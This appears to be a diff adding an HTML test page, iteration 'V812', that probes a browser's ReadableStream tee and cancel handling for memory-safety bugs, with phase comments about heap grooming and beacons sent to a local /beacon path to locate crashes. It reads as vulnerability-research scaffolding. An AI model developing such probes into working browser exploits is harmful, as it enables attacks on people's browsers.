@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <title>V812 - Under-Yield + Hex Dump + Read via tee1 (Full Magic)</title>
+    <style>
+        body { background: #0b0e14; color: #d7e0ea; font-family: monospace; padding: 20px; }
+        #out { background: #161b22; padding: 15px; border-radius: 5px; border: 1px solid #30363d; }
+    </style>
+</head>
+<body>
+    <h1>V812 - Under-Yield + Hex Dump + Read via tee1 (Full Magic)</h1>
+    <div id="out">starting...</div>
+    <script>
+    /* V812: Under-Yield + Hex Dump + Read via tee1 (Full Magic). */
+
+    /* Per round phases:
+     *   T0PRE  - heap groom spray begin
+     *   T1PRE  - tee create (source enqueues 1 chunk, round-based magic)
+     *   T2PRE  - under-yield (yield before read from tee1)
+     *   T2POST - read from tee1 ONCE -> got + hex with round magic
+     *   T3POST - cancel tee1
+     *   TDONE  - clean round
+     *
+     * Crash oracle: last phase beacon without follow-up = crashing phase.
+     * Beacon prefix: V812-
+     */
+    'use strict';
+
+    var O = document.getElementById('out');
+    var ROUNDS = 40;
+
+    function say(s) { O.textContent += '\n' + s; }
+    function bks(tag, body) {
+        var u = '/beacon/V812-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 400)) +
+                '&t=' + Date.now() + '&s=1';
+        try {
+            var x = new XMLHttpRequest();
+            x.open('GET', u, false);
+            x.send(null);
+        } catch (e) {
+            try { new Image().src = u; } catch (e2) {}
+        }
+    }
+
+    var seed = 0x142f;
+    function srnd() { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed / 0x7fffffff; }
+    function snum(n) { return Math.floor(srnd() * n); }
+
+    async function roundOnce(r) {
+        say('T0PRE ' + r + ',phase=spray');
+        bks('T0PRE', r + ',phase=spray');
+
+        say('T1PRE ' + r + ',phase=tee-create');
+        bks('T1PRE', r + ',phase=tee-create');
+        var src = new ReadableStream({
+            start: function (c) {
+                try {
+                    var ab1 = new ArrayBuffer(1024 * 1024);
+                    var u8a1 = new Uint8Array(ab1);
+                    for (var i = 0; i < 64; i++) u8a1[i] = (i * 7 + 1 + r) & 0xff;
+                    c.enqueue(u8a1);
+                    c.close();
+                } catch (e) { return; }
+            },
+            pull: function (c) { return Promise.resolve(); }
+        });
+        var t = src.tee();
+        var tee1 = t[0], tee2 = t[1];
+
+        say('T2PRE ' + r + ',phase=under-yield');
+        bks('T2PRE', r + ',phase=under-yield');
+        await new Promise(function (res) { setTimeout(res, 0); });
+
+        var readRes = 'none';
+        var hex = '';
+        var pr = tee1.getReader().read().then(function (res) {
+            if (res.done) { readRes = 'read=done'; }
+            else {
+                readRes = 'read=got1';
+                var u8 = res.value;
+                var s = '';
+                for (var i = 0; i < u8.length; i++) { s += u8[i].toString(16).padStart(2, '0'); }
+                hex = s.slice(0, 200);
+            }
+        });
+        await pr;
+        say('T2POST ' + r + ',phase=readonce,' + readRes + ',hex=' + hex);
+        bks('T2POST', r + ',phase=readonce,' + readRes + ',hex=' + hex);
+
+        say('T3POST ' + r + ',phase=cancel');
+        bks('T3POST', r + ',phase=cancel');
+        var pc = tee1.cancel().catch(function (e) { return 'cancel=' + (e && e.name); });
+        await pc;
+
+        say('TDONE ' + r + ',phase=clean');
+        bks('TDONE', r + ',phase=clean');
+    }
+
+    async function runRounds() {
+        var r = 0;
+        while (r < ROUNDS) {
+            var rr = r;
+            var res = await roundOnce(rr);
+            await new Promise(function (res2) { setTimeout(res2, 0); });
+            r++;
+        }
+        say('DONE it=' + ROUNDS);
+        bks('DONE', 'it=' + ROUNDS);
+    }
+
+    function run() {
+        say('BOOT ' + 'v812,rounds=' + ROUNDS + ',seed=' + seed);
+        bks('BOOT', 'v812,rounds=' + ROUNDS + ',seed=' + seed);
+        if (typeof ReadableStream === 'undefined') { bks('ABORT', 'no-ReadableStream'); return; }
+        bks('READY', 'streams=ok');
+        runRounds();
+    }
+
+    run();
+    </script>
+</body>
+</html>
